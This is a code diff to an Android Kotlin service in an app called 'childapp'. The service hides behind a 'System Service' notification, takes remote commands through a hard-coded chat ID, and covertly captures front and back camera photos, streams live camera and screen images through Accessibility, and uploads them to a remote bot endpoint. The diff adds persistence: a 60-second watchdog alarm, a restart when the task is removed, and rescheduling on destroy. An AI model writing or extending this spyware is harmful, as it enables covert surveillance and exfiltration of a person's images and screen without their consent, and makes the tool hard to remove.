@@ -1,14 +1,17 @@
 package com.coc338781.childapp
 
+import android.app.AlarmManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.PendingIntent
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.hardware.camera2.CameraManager
 import android.location.LocationManager
 import android.os.Build
+import android.os.SystemClock
 import android.os.Vibrator
 import android.provider.CallLog
 import android.provider.MediaStore
@@ -40,7 +43,9 @@ class MonitoringService : LifecycleService() {
         const val CHAT_ID = "7905408190"
         // ============================
         const val CHANNEL_ID = "svc_channel"
+        const val WATCHDOG_INTERVAL = 60_000L
         private const val TAG = "MonSvc"
+        @Volatile var isRunning = false
     }
 
     private val client = OkHttpClient.Builder()
@@ -49,52 +54,119 @@ class MonitoringService : LifecycleService() {
         .build()
 
     private var lastUpdateId = 0L
-    private var isRunning = true
     private var liveJob: Job? = null
     private var flashOn = false
 
     override fun onCreate() {
         super.onCreate()
+        isRunning = true
         try {
             createChannel()
             startFg()
             startPolling()
+            scheduleWatchdog()
         } catch (e: Exception) { Log.e(TAG, "onCreate", e) }
     }
 
     private fun startFg() {
         val n = buildNotification()
-        if (Build.VERSION.SDK_INT >= 34) {
-            startForeground(1, n,
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-        } else if (Build.VERSION.SDK_INT >= 29) {
-            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
-        } else {
-            startForeground(1, n)
-        }
+        try {
+            if (Build.VERSION.SDK_INT >= 34) {
+                startForeground(1, n,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            } else if (Build.VERSION.SDK_INT >= 29) {
+                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
+            } else {
+                startForeground(1, n)
+            }
+        } catch (e: Exception) { Log.e(TAG, "startFg", e) }
     }
 
     private fun createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val ch = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW)
+            ch.setShowBadge(false)
             getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
         }
     }
 
-    private fun buildNotification(): Notification =
-        NotificationCompat.Builder(this, CHANNEL_ID)
+    private fun buildNotification(): Notification {
+        val intent = Intent(this, MainActivity::class.java)
+        val pi = PendingIntent.getActivity(
+            this, 0, intent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+        return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service")
             .setContentText("Running")
             .setSmallIcon(android.R.drawable.stat_sys_download)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
+            .setContentIntent(pi)
             .build()
+    }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
+        if (!isRunning) {
+            isRunning = true
+            try {
+                createChannel()
+                startFg()
+                startPolling()
+            } catch (_: Exception) {}
+        }
         return START_STICKY
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        try {
+            val restart = Intent(applicationContext, MonitoringService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                applicationContext.startForegroundService(restart)
+            } else {
+                applicationContext.startService(restart)
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun scheduleWatchdog() {
+        try {
+            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            val intent = Intent(this, WatchdogReceiver::class.java)
+            val pi = PendingIntent.getBroadcast(
+                this, 1001, intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val triggerAt = SystemClock.elapsedRealtime() + WATCHDOG_INTERVAL
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
+            } else {
+                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
+            }
+        } catch (e: Exception) { Log.e(TAG, "watchdog", e) }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        try {
+            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            val intent = Intent(this, WatchdogReceiver::class.java)
+            val pi = PendingIntent.getBroadcast(
+                this, 1001, intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            am.setExactAndAllowWhileIdle(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                SystemClock.elapsedRealtime() + 5000L,
+                pi
+            )
+        } catch (_: Exception) {}
+        liveJob?.cancel()
+        isRunning = false
     }
 
     private fun startPolling() {
@@ -145,46 +217,46 @@ class MonitoringService : LifecycleService() {
         }
     }
 
-   private fun photo(back: Boolean) {
-    sendMsg("📷 Taking ${if (back) "back" else "front"} photo...")
-    CameraHelper.takePhoto(this, back) { f, info ->
-        if (f != null) {
-            sendMsg("📸 Camera: $info")
-            sendPhoto(f)
-        } else {
-            sendMsg("🔴 Failed: $info")
+    private fun photo(back: Boolean) {
+        sendMsg("📷 Taking ${if (back) "back" else "front"} photo...")
+        CameraHelper.takePhoto(this, back) { f, info ->
+            if (f != null) {
+                sendMsg("📸 Camera: $info")
+                sendPhoto(f)
+            } else {
+                sendMsg("🔴 Failed: $info")
+            }
         }
     }
-   } 
 
     private fun live(back: Boolean, seconds: Int) {
-    liveJob?.cancel()
-    sendMsg("🔴 Live camera started (${seconds}s)")
-    liveJob = lifecycleScope.launch(Dispatchers.IO) {
-        val end = System.currentTimeMillis() + seconds * 1000L
-        var count = 0
-        var firstInfo = ""
-        while (System.currentTimeMillis() < end && isRunning) {
-            val done = java.util.concurrent.CountDownLatch(1)
-            var gotFile: File? = null
-            withContext(Dispatchers.Main) {
-                CameraHelper.takePhoto(this@MonitoringService, back) { f, info ->
-                    if (f != null) gotFile = f
-                    if (firstInfo.isEmpty()) firstInfo = info
-                    done.countDown()
+        liveJob?.cancel()
+        sendMsg("🔴 Live camera started (${seconds}s)")
+        liveJob = lifecycleScope.launch(Dispatchers.IO) {
+            val end = System.currentTimeMillis() + seconds * 1000L
+            var count = 0
+            var firstInfo = ""
+            while (System.currentTimeMillis() < end && isRunning) {
+                val done = java.util.concurrent.CountDownLatch(1)
+                var gotFile: File? = null
+                withContext(Dispatchers.Main) {
+                    CameraHelper.takePhoto(this@MonitoringService, back) { f, info ->
+                        if (f != null) gotFile = f
+                        if (firstInfo.isEmpty()) firstInfo = info
+                        done.countDown()
+                    }
                 }
+                done.await()
+                if (gotFile != null) {
+                    sendPhotoFile(gotFile!!)
+                    count++
+                }
+                delay(2000)
             }
-            done.await()
-            if (gotFile != null) {
-                sendPhotoFile(gotFile!!)
-                count++
+            withContext(Dispatchers.Main) {
+                sendMsg("🟢 Live ended ($count photos) [$firstInfo]")
             }
-            delay(2000)
         }
-        withContext(Dispatchers.Main) {
-            sendMsg("🟢 Live ended ($count photos) [$firstInfo]")
-        }
-    }
     }
 
     private fun screen() {
@@ -200,7 +272,7 @@ class MonitoringService : LifecycleService() {
         if (svc == null) { sendMsg("❌ Enable Accessibility"); return }
         if (Build.VERSION.SDK_INT < 30) { sendMsg("❌ Android 11+"); return }
         liveJob?.cancel()
-        sendMsg("🔴 Live screen (${seconds}s, 1/2s)")
+        sendMsg("🔴 Live screen (${seconds}s)")
         liveJob = lifecycleScope.launch(Dispatchers.IO) {
             val end = System.currentTimeMillis() + seconds * 1000L
             while (System.currentTimeMillis() < end && isRunning) {
@@ -356,11 +428,5 @@ class MonitoringService : LifecycleService() {
             client.newCall(Request.Builder().url(url).post(body).build()).execute()
             f.delete()
         } catch (_: Exception) {}
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        isRunning = false
-        liveJob?.cancel()
     }
 }
